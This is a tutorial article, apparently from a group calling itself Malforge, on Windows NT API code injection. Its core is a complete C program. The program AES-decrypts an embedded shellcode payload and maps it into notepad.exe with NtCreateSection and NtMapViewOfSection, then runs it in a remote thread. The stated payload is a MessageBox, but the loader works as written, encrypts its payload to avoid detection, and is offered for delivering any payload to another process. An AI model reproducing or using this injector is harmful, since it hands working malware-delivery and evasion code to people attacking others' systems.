# NT API Code Injection

## Introduction

Welcome to my new article! Today, I’ll show you a technique commonly used by malware developers to inject code using low-level NT API functions.

**NT API Code Injection – Key Steps :**

1. Create a new memory section – Use `NtCreateSection` to allocate memory.

2. Copy shellcode to the section – Map a local view and write your payload.

3. Map a local view – Use `NtMapViewOfSection` to get access in the current process.

4. Map a remote view – Map the section into the target process's address space.

5. Execute shellcode in remote process – Use `NtCreateThreadEx` or `RtlCreateUserThread` to run the payload.

![image](https://github.com/user-attachments/assets/cf3c6638-a687-4234-b714-fff0f2adfe31)


**What functions are used in this technique?**

- The core of this code injection technique relies heavily on two key NTAPI functions: `NtCreateSection` and `NtMapViewOfSection`.

- `NtCreateSection` is used to create a new memory section that can be shared between the local process and the target (victim) process.

- `NtMapViewOfSection` is used to create views of a shared memory section. These views allow processes to access the memory section. In this technique, one local view is created for the malware process and one remote view is mapped into     the target process.

Using `NtCreateSection`, a new memory section is created and the shellcode is written into it. Then, `NtMapViewOfSection` is used to map that section into both the local (malware) process and the target (remote) process, effectively sharing the shellcode between them.

---

### What is NT API?

Information by:

> The Windows Native API\
Work in progress The Native API (with capitalized N) is the mostly undocumented application programming interface used. [microsoft.com](https://learn.microsoft.com/en-us/archive/technet-wiki/11831.the-windows-native-api)

The Native API (with capitalized N) is the mostly undocumented application programming interface used internally by the Windows NT family of operating systems. It is predominately used **during system boot**, when other components of Windows are unavailable. The Program Entry point is called [DriverEntry()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize?redirectedfrom=MSDN), the same as for a Windows Device Driver. However, the application runs in Ring 3 the same as a regular Windows Application. Most of the Native API calls are **implemented in** `ntoskrnl.exe` and are **exposed to user mode by** `ntdll.dll`. Some Native API calls are implemented in user mode directly within ntdll.dll.


## Code 
```C
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = {0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8};
unsigned char key[] = {0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84};

unsigned int payload_len = sizeof(payload);

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID(WINAPI *VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect);

typedef VOID(WINAPI *RtlMoveMemory_t)(
    VOID UNALIGNED *Destination,
    const VOID UNALIGNED *Source,
    SIZE_T Length);

typedef FARPROC(WINAPI *RtlCreateUserThread_t)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;       // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS(NTAPI *NtCreateSection_t)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL);

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS(NTAPI *NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT,
    *PSECTION_INHERIT;

int AESDecrypt(char *payload, unsigned int payload_len, char *key, size_t keylen)
{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
    {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE *)key, (DWORD)keylen, 0))
    {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
    {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE *)payload, (DWORD *)&payload_len))
    {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int FindTarget(const char *procname)
{

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32))
    {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32))
    {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0)
        {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

HANDLE FindThread(int pid)
{

    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while (Thread32Next(Snap, &thEntry))
    {
        if (thEntry.th32OwnerProcessID == pid)
        {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }
    }
    CloseHandle(Snap);

    return hThread;
}

// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{

    HANDLE hSection = NULL;
    PVOID pLocalView = NULL, pRemoteView = NULL;
    HANDLE hThread = NULL;
    CLIENT_ID cid;

    // create memory section
    NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if (pNtCreateSection == NULL)
        return -2;
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // create local section view
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if (pNtMapViewOfSection == NULL)
        return -2;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);

    // throw the payload into the section
    memcpy(pLocalView, payload, payload_len);

    // create remote section view (target process)
    pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
    // getchar();

    // execute the payload
    RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if (pRtlCreateUserThread == NULL)
        return -2;
    pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int main(void)
{

    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget("notepad.exe");

    if (pid)
    {
        printf("Notepad.exe PID = %d\n", pid);

        // try to open target process
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                            FALSE, (DWORD)pid);

        if (hProc != NULL)
        {
            // Decrypt and inject payload
            AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));
            InjectVIEW(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
```

The key function used in this technique is `InjectVIEW`, which handles the injection process using section mapping.

## Proof of Concept (PoC)

In the code section, you can see that I’m injecting the shellcode into the `notepad.exe` process.

![image](https://github.com/user-attachments/assets/342919d0-5683-403d-a6a7-b5cddf7e7d62)

The MessageBox is the payload being executed!

## Conclusions

That's all for this technique! It's another option for delivering your payload to a remote process. I hope you enjoyed this article.

Thank you for reading! ;)

**- Malforge Group.**
